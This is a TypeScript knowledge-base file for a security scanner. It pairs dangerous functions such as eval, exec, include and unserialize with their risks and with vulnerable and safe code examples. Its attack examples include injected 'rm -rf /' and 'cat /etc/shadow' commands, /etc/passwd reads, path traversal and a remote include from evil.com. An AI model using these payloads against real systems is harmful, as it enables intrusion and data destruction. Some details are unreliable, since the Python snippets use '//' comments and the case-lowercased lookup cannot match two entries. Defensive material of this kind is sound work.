// Knowledge base for dangerous functions with risk explanations, recommendations, and examples

export interface FunctionKnowledge {
  name: string;
  category: string;
  riskLevel: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  description: string;
  risks: string[];
  recommendations: string[];
  safeAlternatives: string[];
  dangerousExample: {
    code: string;
    language: string;
    explanation: string;
  };
  safeExample: {
    code: string;
    language: string;
    explanation: string;
  };
  cwe?: string[];
  owasp?: string[];
}

export const dangerousFunctionsKnowledge: Record<string, FunctionKnowledge> = {
  // Code Execution
  eval: {
    name: 'eval',
    category: 'code_execution',
    riskLevel: 'CRITICAL',
    description: 'Executes arbitrary code from strings, allowing potential code injection attacks',
    risks: [
      'Remote Code Execution (RCE) vulnerability',
      'Arbitrary code execution from user input',
      'Can bypass security controls',
      'Difficult to sanitize safely',
      'May expose sensitive data or system resources',
    ],
    recommendations: [
      'Never use eval() with user input',
      'Use safe alternatives like JSON.parse() for data',
      'Implement proper input validation and sanitization',
      'Use sandboxed environments if code execution is necessary',
      'Consider using Function constructors with strict mode',
    ],
    safeAlternatives: [
      'JSON.parse() for parsing JSON data',
      'parseInt() or parseFloat() for numbers',
      'Template literals for string interpolation',
      'Object property access for dynamic properties',
      'Function constructors with validation',
    ],
    dangerousExample: {
      code: `// DANGEROUS: User input directly in eval
const userInput = request.query.code;
eval(userInput); // Attacker can execute ANY code!

// Example attack:
// ?code=require('fs').readFileSync('/etc/passwd')`,
      language: 'javascript',
      explanation: 'This allows an attacker to execute arbitrary JavaScript code on the server, potentially reading sensitive files, executing system commands, or compromising the entire system.',
    },
    safeExample: {
      code: `// SAFE: Use JSON.parse for data
const userInput = request.query.data;
try {
  const data = JSON.parse(userInput);
  // Process validated data
  if (typeof data.value === 'number') {
    result = data.value * 2;
  }
} catch (e) {
  // Handle invalid input
  return error('Invalid data format');
}`,
      language: 'javascript',
      explanation: 'Using JSON.parse() only allows valid JSON data, preventing code execution. Additional validation ensures the data matches expected types.',
    },
    cwe: ['CWE-94', 'CWE-95'],
    owasp: ['A03:2021 - Injection'],
  },

  exec: {
    name: 'exec',
    category: 'command_injection',
    riskLevel: 'CRITICAL',
    description: 'Executes system commands, vulnerable to command injection attacks',
    risks: [
      'Command injection leading to system compromise',
      'Unauthorized file access or modification',
      'Privilege escalation',
      'Data exfiltration',
      'System takeover',
    ],
    recommendations: [
      'Never pass user input to exec() functions',
      'Use parameterized APIs instead of shell commands',
      'Implement strict input validation with allowlists',
      'Use language-specific safe alternatives',
      'Run commands with least privilege',
    ],
    safeAlternatives: [
      'Use language-specific libraries (e.g., fs module for file operations)',
      'execFile() with fixed command and validated arguments',
      'Parameterized database queries instead of command-line tools',
      'API calls instead of command-line utilities',
    ],
    dangerousExample: {
      code: `// DANGEROUS: User input in system command
$filename = $_GET['file'];
exec("cat " . $filename); // Command injection!

// Example attack:
// ?file=test.txt; rm -rf /`,
      language: 'php',
      explanation: 'An attacker can inject shell commands using special characters like semicolons, pipes, or backticks, potentially deleting files or executing malicious code.',
    },
    safeExample: {
      code: `// SAFE: Use file system API
$filename = $_GET['file'];

// Validate filename
if (!preg_match('/^[a-zA-Z0-9_.-]+$/', $filename)) {
    die('Invalid filename');
}

// Use safe file reading
$filepath = '/safe/directory/' . basename($filename);
if (file_exists($filepath)) {
    $content = file_get_contents($filepath);
    echo htmlspecialchars($content);
}`,
      language: 'php',
      explanation: 'Using file system functions instead of shell commands, with strict validation and path traversal prevention using basename().',
    },
    cwe: ['CWE-78', 'CWE-77'],
    owasp: ['A03:2021 - Injection'],
  },

  system: {
    name: 'system',
    category: 'command_injection',
    riskLevel: 'CRITICAL',
    description: 'Executes system commands with shell access, extremely dangerous with user input',
    risks: [
      'Full system command execution',
      'Shell command chaining attacks',
      'Unauthorized system access',
      'Potential for complete system compromise',
      'Output directly displayed to user (information disclosure)',
    ],
    recommendations: [
      'Avoid system() entirely if possible',
      'Never use with any user-controllable input',
      'Use safe subprocess libraries with argument arrays',
      'Implement comprehensive input validation',
      'Use chroot jails or containers for isolation',
    ],
    safeAlternatives: [
      'subprocess.run() with shell=False and argument list',
      'Language-specific libraries for common tasks',
      'APIs instead of command-line tools',
      'Precompiled binaries with fixed parameters',
    ],
    dangerousExample: {
      code: `// DANGEROUS: Command injection vulnerability
import os
user_file = request.args.get('file')
os.system(f"ls -la {user_file}") # CRITICAL vulnerability!

# Attack: ?file=; cat /etc/shadow`,
      language: 'python',
      explanation: 'This allows complete command injection, letting attackers execute any system command with the application\'s privileges.',
    },
    safeExample: {
      code: `// SAFE: Use subprocess with argument list
import subprocess
import os

user_file = request.args.get('file')

# Validate input
allowed_dir = '/safe/directory'
safe_path = os.path.join(allowed_dir, os.path.basename(user_file))

# Check if file is within allowed directory
if not safe_path.startswith(allowed_dir):
    return error('Invalid path')

# Use subprocess.run with list (no shell)
result = subprocess.run(
    ['ls', '-la', safe_path],
    capture_output=True,
    timeout=5
)`,
      language: 'python',
      explanation: 'Using subprocess.run() with an argument list instead of shell=True prevents command injection. Input validation ensures the path is safe.',
    },
    cwe: ['CWE-78'],
    owasp: ['A03:2021 - Injection'],
  },

  shell_exec: {
    name: 'shell_exec',
    category: 'command_injection',
    riskLevel: 'CRITICAL',
    description: 'Executes shell commands and returns output, vulnerable to injection',
    risks: [
      'Command injection attacks',
      'Arbitrary command execution',
      'Information disclosure through command output',
      'Potential system compromise',
      'Bypassing application security controls',
    ],
    recommendations: [
      'Replace with safe PHP functions',
      'Use escapeshellarg() and escapeshellcmd() if absolutely necessary',
      'Validate all input against strict allowlists',
      'Use proc_open() with proper configuration',
      'Implement least privilege principle',
    ],
    safeAlternatives: [
      'PHP built-in functions (file_get_contents, etc.)',
      'proc_open() with argument array',
      'curl_exec() for HTTP requests',
      'Database APIs for data operations',
    ],
    dangerousExample: {
      code: `<?php
// DANGEROUS: Direct user input to shell
$domain = $_GET['domain'];
$result = shell_exec("nslookup " . $domain);
echo $result;

// Attack: ?domain=google.com;whoami
?>`,
      language: 'php',
      explanation: 'Attackers can chain commands using semicolons, pipes, or other shell metacharacters to execute arbitrary commands.',
    },
    safeExample: {
      code: `<?php
// SAFE: Use DNS functions
$domain = $_GET['domain'];

// Validate domain format
if (!filter_var('http://' . $domain, FILTER_VALIDATE_URL)) {
    die('Invalid domain');
}

// Use PHP DNS functions
$records = dns_get_record($domain, DNS_A);
echo json_encode($records);
?>`,
      language: 'php',
      explanation: 'Using PHP\'s built-in DNS functions instead of shell commands eliminates command injection risks.',
    },
    cwe: ['CWE-78'],
    owasp: ['A03:2021 - Injection'],
  },

  // File Operations
  include: {
    name: 'include',
    category: 'file_operations',
    riskLevel: 'HIGH',
    description: 'Includes and executes PHP files, vulnerable to local/remote file inclusion',
    risks: [
      'Remote File Inclusion (RFI) attacks',
      'Local File Inclusion (LFI) attacks',
      'Arbitrary code execution',
      'Information disclosure',
      'Directory traversal',
    ],
    recommendations: [
      'Never use user input in include paths',
      'Use allowlist of valid files',
      'Disable allow_url_include in php.ini',
      'Validate and sanitize file paths',
      'Use absolute paths with validated filenames',
    ],
    safeAlternatives: [
      'Autoloading with composer',
      'Switch statements with fixed includes',
      'Configuration arrays mapping to files',
      'Template engines with sandboxing',
    ],
    dangerousExample: {
      code: `<?php
// DANGEROUS: User-controlled include
$page = $_GET['page'];
include($page . ".php");

// Attack: ?page=http://evil.com/shell
// or: ?page=../../etc/passwd%00
?>`,
      language: 'php',
      explanation: 'Attackers can include remote malicious files or local sensitive files, leading to code execution or information disclosure.',
    },
    safeExample: {
      code: `<?php
// SAFE: Allowlist approach
$page = $_GET['page'];

$allowed_pages = [
    'home' => 'views/home.php',
    'about' => 'views/about.php',
    'contact' => 'views/contact.php'
];

if (isset($allowed_pages[$page])) {
    include($allowed_pages[$page]);
} else {
    include('views/404.php');
}
?>`,
      language: 'php',
      explanation: 'Using a strict allowlist ensures only intended files can be included, preventing file inclusion attacks.',
    },
    cwe: ['CWE-98', 'CWE-829'],
    owasp: ['A03:2021 - Injection', 'A05:2021 - Security Misconfiguration'],
  },

  require: {
    name: 'require',
    category: 'file_operations',
    riskLevel: 'HIGH',
    description: 'Includes and executes PHP files (fails on error), vulnerable to file inclusion',
    risks: [
      'Similar risks to include()',
      'Remote File Inclusion (RFI)',
      'Local File Inclusion (LFI)',
      'Code execution vulnerabilities',
      'Path traversal attacks',
    ],
    recommendations: [
      'Use only with static, hardcoded paths',
      'Never use with user-controllable input',
      'Implement strict path validation',
      'Use autoloading mechanisms',
      'Disable allow_url_include',
    ],
    safeAlternatives: [
      'Composer autoloading',
      'Static require statements',
      'Class autoloaders',
      'Configuration-based routing',
    ],
    dangerousExample: {
      code: `<?php
// DANGEROUS: Dynamic require with user input
$module = $_GET['module'];
require("/modules/" . $module . ".php");

// Attack: ?module=../../../etc/passwd%00
?>`,
      language: 'php',
      explanation: 'Path traversal allows accessing files outside the intended directory, potentially exposing sensitive information.',
    },
    safeExample: {
      code: `<?php
// SAFE: Static requires or autoloading
// Option 1: Static requires
require_once 'vendor/autoload.php';

// Option 2: Validated dynamic loading
$module = $_GET['module'];
$safe_name = preg_replace('/[^a-zA-Z0-9]/', '', $module);

if (file_exists("modules/{$safe_name}.php")) {
    require("modules/{$safe_name}.php");
}
?>`,
      language: 'php',
      explanation: 'Using autoloading or strict validation prevents file inclusion attacks.',
    },
    cwe: ['CWE-98'],
    owasp: ['A03:2021 - Injection'],
  },

  // Serialization
  unserialize: {
    name: 'unserialize',
    category: 'deserialization',
    riskLevel: 'CRITICAL',
    description: 'Deserializes data, can lead to object injection and RCE',
    risks: [
      'Object injection attacks',
      'Remote Code Execution',
      'Arbitrary object instantiation',
      'Magic method exploitation (__wakeup, __destruct)',
      'Property-oriented programming attacks',
    ],
    recommendations: [
      'Never unserialize untrusted data',
      'Use JSON instead of serialize/unserialize',
      'Implement HMAC signatures for serialized data',
      'Use allowed_classes option in PHP 7.0+',
      'Validate data before deserialization',
    ],
    safeAlternatives: [
      'json_encode() and json_decode()',
      'PDO prepared statements for database',
      'Structured data formats (JSON, XML with validation)',
      'Type-safe serialization libraries',
    ],
    dangerousExample: {
      code: `<?php
// DANGEROUS: Unserializing user data
$data = $_COOKIE['user_data'];
$user = unserialize($data); // Object injection!

// Attacker can inject malicious serialized objects
// with __wakeup() or __destruct() methods
?>`,
      language: 'php',
      explanation: 'Attackers can craft malicious serialized objects that execute code when unserialized, potentially leading to RCE.',
    },
    safeExample: {
      code: `<?php
// SAFE: Use JSON
$data = $_COOKIE['user_data'];

try {
    $user = json_decode($data, true);
    
    // Validate structure
    if (!isset($user['id']) || !is_numeric($user['id'])) {
        throw new Exception('Invalid data');
    }
    
    // Use validated data
} catch (Exception $e) {
    // Handle error
}
?>`,
      language: 'php',
      explanation: 'JSON doesn\'t allow object instantiation, preventing object injection attacks.',
    },
    cwe: ['CWE-502'],
    owasp: ['A08:2021 - Software and Data Integrity Failures'],
  },

  // JavaScript specific
  Function: {
    name: 'Function',
    category: 'code_execution',
    riskLevel: 'HIGH',
    description: 'Function constructor creates functions from strings, similar to eval',
    risks: [
      'Code injection if used with user input',
      'Similar risks to eval()',
      'Bypassing Content Security Policy',
      'Arbitrary code execution',
      'Scope pollution',
    ],
    recommendations: [
      'Avoid Function constructor with user input',
      'Use arrow functions or regular functions',
      'Implement strict input validation',
      'Use safer alternatives for dynamic behavior',
      'Enable Content Security Policy',
    ],
    safeAlternatives: [
      'Arrow functions: (x) => x * 2',
      'Object methods for dynamic behavior',
      'Strategy pattern for runtime selection',
      'Configuration objects',
    ],
    dangerousExample: {
      code: `// DANGEROUS: Function constructor with user input
const userCode = req.query.code;
const dynamicFunc = new Function('x', userCode);
result = dynamicFunc(10);

// Attack: ?code=require('child_process').exec('rm -rf /')`,
      language: 'javascript',
      explanation: 'Function constructor can execute arbitrary code, similar to eval(), allowing attackers to run malicious commands.',
    },
    safeExample: {
      code: `// SAFE: Use predefined functions
const operations = {
    'double': (x) => x * 2,
    'square': (x) => x * x,
    'increment': (x) => x + 1
};

const operation = req.query.operation;
if (operations[operation]) {
    result = operations[operation](10);
} else {
    result = 'Invalid operation';
}`,
      language: 'javascript',
      explanation: 'Using a predefined set of functions prevents code injection while still allowing dynamic behavior.',
    },
    cwe: ['CWE-94'],
    owasp: ['A03:2021 - Injection'],
  },

  setTimeout: {
    name: 'setTimeout',
    category: 'code_execution',
    riskLevel: 'MEDIUM',
    description: 'Can execute code from strings when passed as first argument',
    risks: [
      'Code injection when used with string arguments',
      'Similar to eval() when misused',
      'Timing-based attacks',
      'Resource exhaustion',
    ],
    recommendations: [
      'Always pass a function, never a string',
      'Use arrow functions or function references',
      'Validate timeout values',
      'Clear timeouts when no longer needed',
    ],
    safeAlternatives: [
      'setTimeout with function reference',
      'setTimeout with arrow function',
      'Promise-based delays',
      'async/await with delay functions',
    ],
    dangerousExample: {
      code: `// DANGEROUS: String argument in setTimeout
const userCode = req.query.code;
setTimeout(userCode, 1000); // Code injection!

// Attack: ?code=require('fs').readFileSync('/etc/passwd')`,
      language: 'javascript',
      explanation: 'Passing a string to setTimeout is equivalent to eval(), allowing code execution.',
    },
    safeExample: {
      code: `// SAFE: Use function reference
const delay = parseInt(req.query.delay) || 1000;

// Validate delay
if (delay < 0 || delay > 10000) {
    return error('Invalid delay');
}

setTimeout(() => {
    // Safe predefined action
    console.log('Delayed action executed');
}, delay);`,
      language: 'javascript',
      explanation: 'Using a function instead of a string prevents code injection.',
    },
    cwe: ['CWE-94'],
    owasp: ['A03:2021 - Injection'],
  },

  setInterval: {
    name: 'setInterval',
    category: 'code_execution',
    riskLevel: 'MEDIUM',
    description: 'Similar to setTimeout, can execute code from strings',
    risks: [
      'Code injection with string arguments',
      'Resource exhaustion from recurring execution',
      'Memory leaks if not cleared',
      'Similar to eval() when misused',
    ],
    recommendations: [
      'Always use function references, not strings',
      'Store interval IDs and clear when done',
      'Validate interval times',
      'Implement maximum interval limits',
    ],
    safeAlternatives: [
      'setInterval with function reference',
      'Recursive setTimeout for more control',
      'Web Workers for background tasks',
      'Event-driven architectures',
    ],
    dangerousExample: {
      code: `// DANGEROUS: String in setInterval
const userCode = req.query.action;
setInterval(userCode, 1000); // Recurring code injection!`,
      language: 'javascript',
      explanation: 'This repeatedly executes arbitrary code, making it even more dangerous than setTimeout.',
    },
    safeExample: {
      code: `// SAFE: Function reference
const interval = parseInt(req.query.interval) || 1000;

if (interval < 100 || interval > 60000) {
    return error('Invalid interval');
}

const timerId = setInterval(() => {
    // Safe predefined action
    updateStatus();
}, interval);

// Clear interval when done
setTimeout(() => clearInterval(timerId), 30000);`,
      language: 'javascript',
      explanation: 'Using functions with validation and proper cleanup prevents abuse.',
    },
    cwe: ['CWE-94'],
    owasp: ['A03:2021 - Injection'],
  },
};

// Function to get knowledge or defaults
export function getFunctionKnowledge(functionName: string): FunctionKnowledge {
  const knowledge = dangerousFunctionsKnowledge[functionName.toLowerCase()];
  
  if (knowledge) {
    return knowledge;
  }

  // Return default knowledge for unknown functions
  return {
    name: functionName,
    category: 'unknown',
    riskLevel: 'MEDIUM',
    description: `${functionName} is flagged as potentially dangerous`,
    risks: [
      'This function may have security implications',
      'Review the context of its usage carefully',
      'Ensure proper input validation',
    ],
    recommendations: [
      'Review the function documentation',
      'Implement input validation',
      'Consider safer alternatives',
      'Apply principle of least privilege',
    ],
    safeAlternatives: [
      'Consult language-specific security guides',
      'Use built-in safe functions when available',
    ],
    dangerousExample: {
      code: `// Review the actual usage in your codebase
// and consult security documentation`,
      language: 'text',
      explanation: 'Specific example not available for this function.',
    },
    safeExample: {
      code: `// Implement proper validation and sanitization
// Use language-specific best practices`,
      language: 'text',
      explanation: 'Consult documentation for safe alternatives.',
    },
  };
}



